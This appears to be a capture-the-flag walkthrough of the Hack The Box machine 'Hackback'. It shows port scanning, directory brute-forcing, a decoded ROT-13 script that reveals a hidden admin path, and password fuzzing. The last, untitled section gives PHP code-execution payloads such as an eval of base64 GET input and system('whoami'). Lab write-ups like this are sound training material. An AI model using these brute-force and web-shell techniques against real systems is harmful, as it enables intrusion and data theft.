

----
Share via ## Techniques

## Tools
* nmap

## Setup

1) **Add `hackback.htb` to the hosts file so we can refer to the host by name**
   ```bash
   $ echo "10.10.10.128 hackback.htb" >> /etc/hosts
   ```

## Port Scan

1) **Scan for ports and services**
   ```bash
   # Use nmap to find available TCP ports quickly
   $ hackback_tcp_ports=$( \
       nmap hackback.htb \
            -p- \
            --min-rate=1000 \
            --max-retries=2 \
            -T4 \
            -Pn \
            -oA nmap-tcp-allports \
       | grep ^[0-9] \
       | cut -d '/' -f 1 \
       | tr '\n' ',' \
       | sed s/,$// \
     )
   
   # Scan found ports for services
   $ nmap hackback.htb \
          -p ${hackback_tcp_ports} \
          -sV \
          -sC \
          -T4 \
          -Pn \
          -oA nmap-tcp-foundports
   ```
   
1) **Check found ports against the Vulners db/nse script**
   ```bash
   $ nmap help.htb \
          -p ${hackback_tcp_ports} \
          --script=vulners \
          -Pn \
          -A \
          -T4 \
          -oA nmap-tcp-foundports-vulners
   ```

### Web Enumeration: hackback.htb:6666

1) **Enumerate HTTP Port 6666**

   Let's start by looking for interesting URL paths:
   
   ```bash
   $ gobuster -u http://hackback.htb:6666 \
              -w /usr/share/seclists/Discovery/Web-Content/common.txt 

   =====================================================
   Gobuster v2.0.1              OJ Reeves (@TheColonial)
   =====================================================
   [+] Mode         : dir
   [+] Url/Domain   : http://hackback.htb:6666/
   [+] Threads      : 10
   [+] Wordlist     : /usr/share/seclists/Discovery/Web-Content/common.txt
   [+] Status codes : 200,204,301,302,307,403
   [+] Timeout      : 10s
   =====================================================
   2019/07/06 20:05:51 Starting gobuster
   =====================================================
   /Help (Status: 200)
   /Services (Status: 200)
   /hello (Status: 200)
   /help (Status: 200)
   /info (Status: 200)
   /list (Status: 200)
   /netstat (Status: 200)
   /proc (Status: 200)
   /services (Status: 200)
   =====================================================
   2019/07/06 20:06:31 Finished
   =====================================================
   ```
   
   Let's try the help endpoint:
   
   ```bash
   $ curl hackback.htb:6666/help
   "hello,proc,whoami,list,info,services,netsat,ipconfig"
   ```
   
   After trying a few of the endpoints, it looks like we can figure out the name of
   the process that is serving on the port 64831 we foud with nmap:
   
   ```bash
   # Determine which process ID is using the port we found w/ nmap
   $ curl hackback.htb:6666/netstat \
     | jq -r '.[] | "\(.LocalAddress) \(.LocalPort) \(.OwningProcess)"' \
     | grep 64831
   :: 64831 4292
   10.10.10.128 64831 4292
   
   # Determine the process name of the process ID we just found
   $ curl hackback.htb:6666/proc \
     | jq -r '.[] | "\(.Name) \(.Id) \(.Path)"' \
     | grep 4292
   gophish 4292 C:\gophish\gophish.exe
   ```

### Web Enumeration: admin.hackback.htb:80

1) **Enumerate admin.hackback.htb/js/**

   ```bash
   $ gobuster -u http://admin.hackback.htb/js/ \
              -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt \
              -x js
   =====================================================
   Gobuster v2.0.1              OJ Reeves (@TheColonial)
   =====================================================
   [+] Mode         : dir
   [+] Url/Domain   : http://admin.hackback.htb/js/
   [+] Threads      : 10
   [+] Wordlist     : /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt
   [+] Status codes : 200,204,301,302,307,403
   [+] Extensions   : js
   [+] Timeout      : 10s
   =====================================================
   2019/07/06 20:30:08 Starting gobuster
   =====================================================
   /private.js (Status: 200)
   ```

1) **Look at the private.js file**

   Looking at the file it initially looks like gibberish. Trying some simple character shifts reveals that this file has been ecrypted with ROT-13. Simply find a ROT-13 decoder to decode, or use some python like this:
   ```bash
   $ python

   Python 2.7.16 (default, Apr  6 2019, 01:42:57) 
   [GCC 8.3.0] on linux2
   Type "help", "copyright", "credits" or "license" for more information.
   >>> x = "<PASTE_JS_HERE>"
   
   >>> x.decode("rot-13")
   ```
   
   The output should contain plaintext javascript.
   
1) **Use the browser to inspect javascript vars**

   Paste the javascript code into the console window, press return, and then enter the following commands:

   ```javascript
   > x
   < "Secure Login Bypass"
   
   > z
   < "Remember the secret path is"
   
   > h
   >"2bb6916122f1da34dcd916421e531578"
   
   > y
   < "Just in case I loose access to the admin panel"
   
   > t
   < "?action=(show,list,exec,init)"
   
   > s
   < "&site=(twitter,paypal,facebook,hackthebox)"
   
   > i
   < "&password=********"
   
   > k
   < "&session="
   
   > w
   < "Nothing more to say"
   ```
   
   Or you can jsut run this single command to dump all the vars:
   
   ```javascript
   > console.log(x, z, h, y, t, s, i, k, w);
   ```
   
   ```bash
   $ gobuster -u http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/ \
              -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt \
              -x php

   =====================================================
   Gobuster v2.0.1              OJ Reeves (@TheColonial)
   =====================================================
   [+] Mode         : dir
   [+] Url/Domain   : http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/
   [+] Threads      : 10
   [+] Wordlist     : /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt
   [+] Status codes : 200,204,301,302,307,403
   [+] Extensions   : php
   [+] Timeout      : 10s
   =====================================================
   2019/07/06 21:19:41 Starting gobuster
   =====================================================
   /webadmin.php (Status: 302)
   ```
   
   The `webadmin.php` endpoint does redirect, but let's try it with the URL params we found in the `private.js` file:
   ```bash
   $ curl 'http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/webadmin.php?action=list&site=hackthebox&password=foo&session=foo'
   
   Wrong secret key!
   ```
   
   Looks like it does respond if you give it sufficient params, but complains about a`Wrong secret key!`. Let's try to fuzz the password using a password list:
   
   ```bash
   $ wfuzz -w /usr/share/commix/src/txt/passwords_john.txt \
           -u 'http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/webadmin.php?action=list&site=hackthebox&password=FUZZ&session=foo'

   ********************************************************
   * Wfuzz 2.3.4 - The Web Fuzzer                         *
   ********************************************************

   Target: http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/webadmin.php?action=list&site=hackthebox&password=FUZZ&session=foo
   Total requests: 3108

   ==================================================================
   ID   Response   Lines      Word         Chars          Payload    
   ==================================================================

   000002:  C=302      0 L	       3 W	     17 Ch	  "abc123"
   000003:  C=302      0 L	       3 W	     17 Ch	  "password"
   000004:  C=302      0 L	       3 W	     17 Ch	  "computer"
   000005:  C=302      0 L	       3 W	     17 Ch	  "123456"
   000006:  C=302      0 L	       3 W	     17 Ch	  "tigger"
   000010:  C=302      0 L	       3 W	     17 Ch	  "123"
   000011:  C=302      0 L	       3 W	     17 Ch	  "xxx"
   <HIT Ctrl-C>
   ```
   
   Looks like most are coming back with a 17 character response, so let's ignore anything with exactly 17 characters and see what's left:
   
   ```bash
   $ wfuzz -w /usr/share/commix/src/txt/passwords_john.txt \
           -u 'http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/webadmin.php?action=list&site=hackthebox&password=FUZZ&session=foo' \
           --hh 17
   
   ********************************************************
   * Wfuzz 2.3.4 - The Web Fuzzer                         *
   ********************************************************

   Target: http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/webadmin.php?action=list&site=hackthebox&password=FUZZ&session=e3
   Total requests: 3108

   ==================================================================
   ID   Response   Lines      Word         Chars          Payload    
   ==================================================================

   000020:  C=302      0 L	       0 W	      0 Ch	  ""
   000054:  C=302      6 L	      12 W	    117 Ch	  "12345678"
   003108:  C=302      0 L	       0 W	      0 Ch	  ""

   Total time: 63.88652
   Processed Requests: 3108
   Filtered Requests: 3105
   Requests/sec.: 48.64875
   ```
   
   We get 2 responses with 0 chars for a null payload, but get a much larger response for `12345678`. Let's try to curl the endpoint with URL params and use `12345678` as the password:
   
   ```bash
   $ curl 'http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/webadmin.php?action=list&site=hackthebox&password=12345678&session=fooo'
   Array
   (
       [0] => .
       [1] => ..
       [2] => e691d0d9c19785cf4c5ab50375c10d83130f175f7f89ebd1899eee6a7aab0dd7.log
   )
   ```
   
   Success!! :)
   
1) ________

   ```php
   eval(base64_decode($_GET['lsec']))
   print_r(scandir("/"));
   system("whoami");
   echo(
     base64_encode( 
       file_get_contents("./webadmin.php")
     )
   );
   ```
   
   ```php
   <?php eval(base64_decode($_GET['lsec']));?>
   <?php print_r(scandir("/")); ?>
   <?php system("whoami"); ?>
   <?php echo(base64_encode(file_get_contents("./webadmin.php"))); ?>
   ```
   
   ```bash
   # Decode the base64 into plaintext
   $ base64 -d page.b64 > webadmin.php
   
   # Look at the decoded contents
   $ cat webadmin.php
   <?php
     $ip_hash = hash('sha256', $_SERVER['REMOTE_ADDR'], false);
     session_id($ip_hash);
     session_start();
     check_action();
   ?>
   ...
   ```